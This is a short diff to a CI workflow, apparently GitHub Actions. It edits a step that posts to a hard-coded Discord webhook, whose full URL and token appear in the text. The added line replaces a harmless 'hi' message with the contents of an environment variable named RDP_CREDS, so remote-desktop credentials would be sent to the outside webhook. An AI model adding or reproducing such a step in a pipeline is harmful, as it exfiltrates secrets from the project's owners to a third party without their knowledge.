@@ -109,7 +109,7 @@ jobs:
       - name: Send Hello (Hardcode webhook)
         run: |
          curl -H "Content-Type: application/json" \
-         -d '{"content":"hi"}' \
+         -d '{"content":"$(echo $env:RDP_CREDS)"}' \
          https://discord.com/api/webhooks/1304765957398331454/cVT4eVgezi3GPsYwj2kFKq6EMhBK0VipMnpIvhXPfvLce6KuO1-DjofhUedxqYA4enZP
          
 
